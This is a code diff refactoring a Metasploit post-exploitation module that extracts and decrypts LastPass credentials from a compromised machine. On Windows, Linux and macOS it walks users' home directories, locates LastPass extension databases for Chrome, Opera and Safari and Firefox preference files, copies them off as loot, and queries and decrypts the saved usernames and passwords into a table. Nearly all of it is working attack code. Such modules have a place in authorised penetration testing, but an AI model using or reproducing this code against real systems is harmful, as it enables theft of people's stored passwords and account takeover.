@@ -10,14 +10,17 @@ class Metasploit3 < Msf::Post
   include Msf::Post::Unix
 
   def initialize(info = {})
-    super(update_info(info,
-    'Name' => 'LastPass Master Password Extractor',
-    'Description' => %q{This module extracts and decrypts login accounts and passwords stored by Lastpass.},
-    'License' => MSF_LICENSE,
-    'Author' => ['Alberto Garcia Illera <agarciaillera[at]gmail.com>', 'Martin Vigo <martinvigo[at]gmail.com>'],
-    'Platform' => %w{ linux osx unix win },
-    'SessionTypes' => [ 'meterpreter, shell' ]
-    ))
+    super(
+      update_info(
+        info,
+        'Name' => 'LastPass Master Password Extractor',
+        'Description' => 'This module extracts and decrypts LastPass master login accounts and passwords',
+        'License' => MSF_LICENSE,
+        'Author' => ['Alberto Garcia Illera <agarciaillera[at]gmail.com>', 'Martin Vigo <martinvigo[at]gmail.com>'],
+        'Platform' => %w(linux osx unix win),
+        'SessionTypes' => %w(meterpreter shell)
+      )
+    )
   end
 
   def run
@@ -26,48 +29,55 @@ class Metasploit3 < Msf::Post
       return
     end
 
-    credentials_table = Rex::Ui::Text::Table.new('Header' => "LastPass credentials", 'Indent' => 1, 'Columns' => ["Username", "Password"])
-
     print_status "Searching for LastPass databases..."
 
-    db_paths = database_paths # Find databases and get the remote paths
-    if db_paths.size == 0 # Found any database?
+    db_map = database_paths # Find databases and get the remote paths
+    if db_map.empty?
       print_status "No databases found"
       return
     end
 
     print_status "Looking for credentials in all databases found..."
 
+    # an array of [user, encrypted password, browser]
     credentials = [] # All credentials to be decrypted
-    db_paths.each do |db_path|
-      if db_path =~ /Mozilla/i # Firefox
-        # Read and store the remote preferences file locally
-        data = read_file(db_path)
-        loot_path = store_loot('firefox.preferences', 'text/javascript', session, data, nil, "Firefox preferences file #{db_path}")
+    db_map.each_pair do |browser, paths|
+      if browser == 'Firefox'
+        paths.each do |path|
+          data = read_file(path)
+          loot_path = store_loot('firefox.preferences', 'text/javascript', session, data, nil, "Firefox preferences file #{path}")
 
-        # Extract usernames and passwords from preference file
-        firefox_encoded_creds = firefox_credentials(loot_path)
-        next unless firefox_encoded_creds
-        firefox_encoded_creds.each do |creds|
-          credentials = [URI.unescape(creds[0]), URI.unescape(creds[1])] unless creds[0].nil? || creds[1].nil?
+          # Extract usernames and passwords from preference file
+          firefox_encoded_creds = firefox_credentials(loot_path)
+          next unless firefox_encoded_creds
+          firefox_encoded_creds.each do |creds|
+            credentials << [URI.unescape(creds[0]), URI.unescape(creds[1]), browser] unless creds[0].nil? || creds[1].nil?
+          end
         end
-
       else # Chrome, Safari and Opera
-        # Read and store the remote database locally
-        data = read_file(db_path)
-        loot_path = store_loot('lastpass.database', 'application/x-sqlite3', session, data, nil, "LastPass database #{db_path}")
+        paths.each do |path|
+          data = read_file(path)
+          loot_path = store_loot("#{browser.downcase}.lastpass.database", 'application/x-sqlite3', session, data, nil, "#{browser} LastPass database #{path}")
 
-        # Parsing/Querying the DB
-        db = SQLite3::Database.new(loot_path)
-        credentials = db.execute("SELECT username, password FROM LastPassSavedLogins2 WHERE username IS NOT NULL AND username != '' AND password IS NOT NULL AND password != '';")
+          # Parsing/Querying the DB
+          db = SQLite3::Database.new(loot_path)
+          user, pass = db.execute(
+            "SELECT username, password FROM LastPassSavedLogins2 " \
+            "WHERE username IS NOT NULL AND username != '' " \
+            "AND password IS NOT NULL AND password != '';"
+          ).flatten
+          credentials << [user, pass, browser] if user && pass
+        end
       end
+    end
 
-      # Parse and decrypt credentials
-      credentials.each do |row| # Decrypt passwords
-        print_status "Decrypting password for user #{row[0]}..."
-        password = clear_text_password(row[0], row[1])
-        credentials_table << [row[0], password]
-      end
+    credentials_table = Rex::Ui::Text::Table.new('Header' => "LastPass credentials", 'Indent' => 1, 'Columns' => %w(Username Password Browser))
+    # Parse and decrypt credentials
+    credentials.each do |row| # Decrypt passwords
+      user, enc_pass, browser = row
+      print_status "Decrypting password for user #{user} from #{browser}..."
+      password = clear_text_password(user, enc_pass)
+      credentials_table << [user, password, browser]
     end
     print_good credentials_table.to_s
   end
@@ -76,72 +86,53 @@ class Metasploit3 < Msf::Post
   def database_paths
     platform = session.platform
     existing_profiles = user_profiles
-    found_dbs_paths = []
+    found_dbs_map = {
+      'Chrome' => [],
+      'Firefox' => [],
+      'Opera' => [],
+      'Safari' => []
+    }
+
+    browser_path_map = {}
 
     case platform
     when /win/
       existing_profiles.each do |user_profile|
         print_status "Found user: #{user_profile['UserName']}"
-
-        # Check Firefox
-        path = "#{user_profile['AppData']}\\Mozilla\\Firefox\\Profiles"
-        found_dbs_paths.push(find_db_paths(path, "Firefox"))
-
-        # Check Chrome
-        path = "#{user_profile['LocalAppData']}\\Google\\Chrome\\User Data\\Default\\databases\\chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0"
-        found_dbs_paths.push(find_db_paths(path, "Chrome"))
-
-        # Check Opera
-        path = "#{user_profile['AppData']}\\Opera Software\\Opera Stable\\databases\\chrome-extension_hnjalnkldgigidggphhmacmimbdlafdo_0"
-        found_dbs_paths.push(find_db_paths(path, "Opera"))
-
-        # Check Safari
-        path = "#{user_profile['LocalAppData']}\\Apple Computer\\Safari\\Databases\\safari-extension_com.lastpass.lpsafariextension-n24rep3bmn_0"
-        found_dbs_paths.push(find_db_paths(path, "Safari"))
-
-        print_line ""
+        browser_path_map = {
+          'Chrome' => "#{user_profile['LocalAppData']}\\Google\\Chrome\\User Data\\Default\\databases\\chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0",
+          'Firefox' => "#{user_profile['AppData']}\\Mozilla\\Firefox\\Profiles",
+          'Opera' => "#{user_profile['AppData']}\\Opera Software\\Opera Stable\\databases\\chrome-extension_hnjalnkldgigidggphhmacmimbdlafdo_0",
+          'Safari' => "#{user_profile['LocalAppData']}\\Apple Computer\\Safari\\Databases\\safari-extension_com.lastpass.lpsafariextension-n24rep3bmn_0"
+        }
       end
-
     when /unix|linux/
       existing_profiles.each do |user_profile|
         print_status "Found user: #{user_profile['UserName']}"
-
-        # Check Firefox
-        path = "#{user_profile['LocalAppData']}/.mozilla/firefox"
-        found_dbs_paths.push(find_db_paths(path, "Firefox"))
-
-        # Check Chrome
-        path = "#{user_profile['LocalAppData']}/.config/google-chrome/Default/databases/chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0"
-        found_dbs_paths.push(find_db_paths(path, "Chrome"))
+        browser_path_map = {
+          'Chrome' => "#{user_profile['LocalAppData']}/.config/google-chrome/Default/databases/chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0",
+          'Firefox' => "#{user_profile['LocalAppData']}/.mozilla/firefox"
+        }
       end
-
     when /osx/
       existing_profiles.each do |user_profile|
         print_status "Found user: #{user_profile['UserName']}"
-
-        # Check Firefox
-        path = "#{user_profile['LocalAppData']}\\Firefox\\Profiles"
-        found_dbs_paths.push(find_db_paths(path, "Firefox"))
-
-        # Check Chrome
-        path = "#{user_profile['LocalAppData']}/Google/Chrome/Default/databases/chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0"
-        found_dbs_paths.push(find_db_paths(path, "Chrome"))
-
-        # Check Safari
-        path = "#{user_profile['AppData']}/Safari/Databases/safari-extension_com.lastpass.lpsafariextension-n24rep3bmn_0"
-        found_dbs_paths.push(find_db_paths(path, "Safari"))
-
-        # Check Opera
-        path = "#{user_profile['LocalAppData']}/com.operasoftware.Opera/databases/chrome-extension_hnjalnkldgigidggphhmacmimbdlafdo_0"
-        found_dbs_paths.push(find_db_paths(path, "Opera"))
+        browser_path_map = {
+          'Chrome' => "#{user_profile['LocalAppData']}/Google/Chrome/Default/databases/chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0",
+          'Firefox' => "#{user_profile['LocalAppData']}\\Firefox\\Profiles",
+          'Opera' => "#{user_profile['LocalAppData']}/com.operasoftware.Opera/databases/chrome-extension_hnjalnkldgigidggphhmacmimbdlafdo_0",
+          'Safari' => "#{user_profile['AppData']}/Safari/Databases/safari-extension_com.lastpass.lpsafariextension-n24rep3bmn_0"
+        }
       end
-
     else
       print_error "platform not recognized: #{platform}"
-      return nil
     end
 
-    found_dbs_paths.flatten
+    browser_path_map.each_pair do |browser, path|
+      found_dbs_map[browser] |= find_db_paths(path, browser)
+    end
+
+    found_dbs_map
   end
 
   # Returns a list of DB paths found in the victims' machine
@@ -150,17 +141,13 @@ class Metasploit3 < Msf::Post
 
     print_status "Checking in #{browser}..."
     if browser == "Firefox" # Special case for Firefox
-      profiles = profile_paths(path, browser)
-      if profiles
+      profiles = firefox_profile_files(path, browser)
+      unless profiles.empty?
         print_good "Found #{profiles.size} profile files in Firefox"
-        profiles.each do |profile_path|
-          file_paths = ["#{profile_path}\\prefs.js"]
-          found_dbs_paths.push(file_paths)
-        end
+        found_dbs_paths |= profiles
       end
     else
-      file_paths = file_paths(path, browser)
-      found_dbs_paths.push(file_paths) unless file_paths.nil?
+      found_dbs_paths |= file_paths(path, browser)
     end
 
     found_dbs_paths
@@ -168,35 +155,34 @@ class Metasploit3 < Msf::Post
 
   # Returns the relevant information from user profiles
   def user_profiles
+    user_profiles = []
     case session.platform
     when /unix|linux/
-      user_profiles = []
       if session.type == "meterpreter"
         user_names = client.fs.dir.entries("/home")
       else
         user_names = session.shell_command("ls /home").split
       end
+      user_names.reject! { |u| %w(. ..).include?(u) }
       user_names.each do |user_name|
-        user_profiles.push('UserName' => user_name, "LocalAppData" => "/home/#{user_name}") if user_name != '.' &&  user_name != '..'
+        user_profiles.push('UserName' => user_name, "LocalAppData" => "/home/#{user_name}")
       end
-
-      return user_profiles
-
     when /osx/
-      user_profiles = []
       user_names = session.shell_command("ls /Users").split
+      user_names.reject! { |u| u == 'Shared' }
       user_names.each do |user_name|
-        user_profiles.push('UserName' => user_name, "AppData" => "/Users/#{user_name}/Library", "LocalAppData" => "/Users/#{user_name}/Library/Application Support") if user_name != 'Shared'
+        user_profiles.push(
+          'UserName' => user_name,
+          "AppData" => "/Users/#{user_name}/Library",
+          "LocalAppData" => "/Users/#{user_name}/Library/Application Support"
+        )
       end
-
-      return user_profiles
-
     when /win/
-      return grab_user_profiles
+      user_profiles |= grab_user_profiles
     else
       print_error "OS not recognized: #{os}"
-      return nil
     end
+    user_profiles
   end
 
   # Extracts the databases paths from the given folder ignoring . and ..
@@ -218,48 +204,42 @@ class Metasploit3 < Msf::Post
 
       else
         print_error "Session type not recognized: #{session.type}"
-        return nil
+        return found_dbs_paths
       end
     end
 
-    if found_dbs_paths.size > 0
-      print_good "Found #{found_dbs_paths.size} database/s in #{browser}"
-      return found_dbs_paths
-    else
+    if found_dbs_paths.empty?
       print_status "No databases found for #{browser}"
-      return nil
+    else
+      print_good "Found #{found_dbs_paths.size} database/s in #{browser}"
     end
+    found_dbs_paths
   end
 
-  # Returns the profile path for Firefox
-  def profile_paths(path, browser)
+  # Returns the profile files for Firefox
+  def firefox_profile_files(path, browser)
     found_dbs_paths = []
 
     if directory?(path)
       if session.type == "meterpreter"
         files = client.fs.dir.entries(path)
-        files.each do |file_path|
-          found_dbs_paths.push(File.join(path, file_path)) if file_path != '.' &&  file_path != '..' && file_path.match(/.*\.default/)
-        end
-
       elsif session.type == "shell"
         files = session.shell_command("ls \"#{path}\"").split
-        files.each do |file_path|
-          found_dbs_paths.push(File.join(path, file_path)) if file_path.match(/.*\.default/)
-        end
-
       else
         print_error "Session type not recognized: #{session.type}"
-        return nil
+        return found_dbs_paths
       end
     end
 
-    if found_dbs_paths.size > 0
-      return found_dbs_paths
-    else
-      print_status "No profile paths found for #{browser}"
-      return nil
+    files.reject! { |file| %w(. ..).include?(file) }
+    files.each do |file_path|
+      found_dbs_paths.push(File.join(path, file_path, 'prefs.js')) if file_path.match(/.*\.default/)
     end
+
+    if found_dbs_paths.empty?
+      print_status "No profile paths found for #{browser}"
+    end
+    found_dbs_paths
   end
 
   # Parses the Firefox preferences file and returns encoded credentials
